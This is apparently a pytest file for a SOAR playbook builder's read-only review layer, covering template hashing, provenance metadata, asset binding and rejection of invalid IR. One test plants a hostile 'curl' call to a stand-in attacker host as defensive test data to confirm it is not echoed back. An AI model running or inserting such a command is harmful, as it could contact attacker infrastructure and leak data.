"""Read-only IR review boundary and artifact provenance tests."""

from __future__ import annotations

import copy
import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1] / "soar_playbook_builder"
sys.path.insert(0, str(ROOT))

from compiler import parse_python_ir, parse_visual_ir  # noqa: E402
from ir.fixtures import smoke_ir_document  # noqa: E402
from trusted_review import (  # noqa: E402
    ReviewContext,
    list_templates,
    retrieve_candidates,
    review_ir_document,
    review_template,
)
from validate.fixtures import (  # noqa: E402
    FIXTURE_EVALUATED_AT,
    qualified_smoke_index,
)


def _context(**changes):
    values = {
        "operating_mode": "air_gapped",
        "evaluated_at": FIXTURE_EVALUATED_AT,
        "generated_at": FIXTURE_EVALUATED_AT,
        "origin": "template",
    }
    values.update(changes)
    return ReviewContext(**values)


def test_template_list_is_hash_addressed_and_review_only():
    payload = list_templates()
    assert payload["status"] == "success"
    assert payload["count"] == 11
    assert payload["review_only"] is True
    assert payload["import_enabled"] is False
    assert all(len(row["ir_sha256"]) == 64 for row in payload["templates"])
    assert "source" not in payload

    filtered = list_templates("ServiceNow P1 ticket", limit=3)
    assert filtered["templates"][0]["id"] == "servicenow-incident"


def test_hello_template_produces_deterministic_review_artifacts_only():
    index = qualified_smoke_index()
    first = review_template("hello", index, context=_context())
    second = review_template("hello", index, context=_context())

    assert first == second
    assert first["status"] == "success"
    assert first["review_only"] is True
    assert first["import_enabled"] is False
    assert first["ready_for_import"] is False
    assert first["import_block_reason"] == "TRUSTED_IMPORT_DISABLED"
    assert first["gap_report"]["status"] == "ok"
    assert first["compile_eligible"] is True
    assert "source" not in first

    ir_hash = first["ir_sha256"]
    artifacts = first["artifacts"]
    assert parse_python_ir(artifacts["python_preview"]).sha256() == ir_hash
    assert parse_visual_ir(artifacts["visual_preview"]).sha256() == ir_hash
    assert len(artifacts["python_sha256"]) == 64
    assert len(artifacts["visual_sha256"]) == 64
    assert len(first["review_id"]) == 64


def test_action_template_remains_blocked_without_live_evidence_and_asset():
    payload = review_template(
        "servicenow-incident",
        qualified_smoke_index(),
        context=_context(operating_mode="connected"),
    )
    assert payload["status"] == "success"
    assert payload["compile_eligible"] is False
    assert payload["ready_for_import"] is False
    ids = {gap["id"] for gap in payload["gap_report"]["gaps"]}
    assert "ACTION_APP_UNKNOWN" in ids


def test_asset_binding_is_applied_only_to_exact_action_node():
    index = qualified_smoke_index()
    document = smoke_ir_document()
    payload = review_ir_document(
        document,
        index,
        context=_context(origin="manual"),
        asset_bindings={"lookup_user": "okta_lab"},
    )
    assert payload["status"] == "success"
    action = next(
        node for node in payload["ir"]["nodes"] if node["type"] == "action"
    )
    assert action["asset"] == {"kind": "asset", "name": "okta_lab"}

    invalid = review_ir_document(
        document,
        index,
        context=_context(origin="manual"),
        asset_bindings={"not_an_action": "okta_lab"},
    )
    assert invalid["error_code"] == "REVIEW_INPUT_INVALID"
    assert invalid["import_enabled"] is False


def test_model_provenance_is_authoritative_and_manual_review_removes_it():
    document = smoke_ir_document()
    document["metadata"].update(
        {
            "capability_index_version": "invented",
            "operating_mode": "connected",
            "model": "invented",
            "prompt_version": "invented",
            "generated_at": "1970-01-01T00:00:00Z",
        }
    )
    model = review_ir_document(
        document,
        qualified_smoke_index(),
        context=_context(
            origin="model",
            model="qualified-local-model",
            prompt_version="ir-generate-v1",
        ),
    )
    metadata = model["ir"]["metadata"]
    assert metadata["capability_index_version"] == "qualified-v1"
    assert metadata["operating_mode"] == "air_gapped"
    assert metadata["model"] == "qualified-local-model"
    assert metadata["prompt_version"] == "ir-generate-v1"
    assert metadata["generated_at"] == FIXTURE_EVALUATED_AT

    manual = review_ir_document(
        document,
        qualified_smoke_index(),
        context=_context(origin="manual"),
    )
    assert "model" not in manual["ir"]["metadata"]
    assert "prompt_version" not in manual["ir"]["metadata"]


def test_invalid_ir_does_not_echo_executable_model_text():
    document = smoke_ir_document()
    hostile = "curl https://attacker.invalid/private"
    action = next(node for node in document["nodes"] if node["type"] == "action")
    action["python"] = hostile
    payload = review_ir_document(
        document,
        qualified_smoke_index(),
        context=_context(origin="manual"),
    )
    assert payload["error_code"] == "IR_INVALID"
    assert payload["issues"][0]["code"] == "UNKNOWN_FIELD"
    assert hostile not in json.dumps(payload)
    assert payload["import_enabled"] is False


def test_unknown_template_and_retrieval_are_safe_read_only_payloads():
    missing = review_template(
        "does-not-exist",
        qualified_smoke_index(),
        context=_context(),
    )
    assert missing["error_code"] == "IR_TEMPLATE_NOT_FOUND"
    assert missing["import_enabled"] is False

    result = retrieve_candidates(
        "look up Okta user",
        qualified_smoke_index(),
        action_limit=2,
        template_limit=2,
    )
    assert result["review_only"] is True
    assert result["import_enabled"] is False
    assert len(result["retrieval"]["actions"]) <= 2
    assert len(result["retrieval"]["templates"]) <= 2


def test_review_does_not_mutate_caller_document():
    document = smoke_ir_document()
    original = copy.deepcopy(document)
    review_ir_document(
        document,
        qualified_smoke_index(),
        context=_context(origin="manual"),
    )
    assert document == original
